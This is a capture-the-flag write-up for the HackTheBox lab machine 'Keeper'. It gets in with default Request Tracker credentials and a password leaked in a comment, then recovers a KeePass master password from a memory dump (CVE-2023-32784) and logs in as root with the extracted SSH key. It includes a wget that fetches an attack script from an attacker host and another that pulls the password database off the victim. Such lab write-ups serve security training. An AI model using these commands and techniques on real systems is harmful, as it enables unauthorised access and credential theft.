---
title: HTB - Keeper
layout: writeup
date: 2026-04-14
dificultad: Easy
plataforma: HackTheBox
lang: en
---
# Keeper HTB Machine

## 🧠 Enumeration

We start with a full scan:

```bash
nmap -p- -T4 --min-rate 5000 -sV -sC -O -Pn -sS 10.10.11.227 -vvv
```

Open ports:

*80 (HTTP)
*22 (SSH)

![Nmap](/images/keeper_1.png)

The website redirects to:

```
tickets.keeper.htb/rt/
```



## 🌐 Web Enumeration

Typical problem: it did not resolve the domain.

```bash
sudo vim /etc/hosts
```

We add:

```
10.10.11.227 tickets.keeper.htb
```

![Hosts](/images/keeper_2.png)

---

## 💥 Login Panel

Login with Request Tracker version is detected.

Tried SQLi (CVE-2013-3525) → not helpful.

---

## 🔐 Default credentials

```text
user: root
pass: password
```

👉 Access achieved.

![Login](/images/keeper_3.png)

---

## 👀 User enumeration

User found:

```
lnorgaard
```

Interesting comment:

```
Welcome2023!
```

![Leak](/images/keeper_4.png)

---

## 🔑 SSH Access

```bash
ssh lnorgaard@10.10.11.227
```
:
⚠️ Important:

* is **L**norgaard, not Inorgaard

---

## 📦 Interesting files

```bash
RT30000.zip
```

```bash
unzip RT30000.zip
```

Content:

* KeePassDumpFull.dmp
* passcodes.kdbx

![Files](/images/keeper_5.png)

---

## 🧨 KeePass exploitation

CVE:

```
CVE-2023-32784
```

Allows you to recover password from memory dump.

---

## 🐍 Script

```bash
python3 -m http.server 80
```

```bash
wget http://ATTACKER/keepass_dump.py
python3 keepass_dump.py -f KeePassDumpFull.dmp
```

![Dump](/images/keeper_6.png)

---

## 🔍 Password recovered

```
rødgrød med fløde
```

---

## 🔓 Open KeePass

```bash
sudo apt install keepass2
```

```bash
wget http://victim:8080/passcodes.kdbx
```

Open with the passphrase.

![KeePass](/images/keeper_7.png)

---

## 🧑‍💻 Root

We convert key:

```bash
sudo apt install putty-tools
puttygen idkey.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
```

---

## 🚀 Final access

```bash
ssh -i id_rsa root@10.10.11.227
```

![Root](/images/keeper_8.png)

---

## 🏁 Root flag

```bash
cat root.txt
```

---

## 🧾 Conclusion

Machine focused on:

* Web enumeration
* Exposed credentials
* KeePass dump exploitation
* SSH key abuse

👉 Small bugs → full access

---

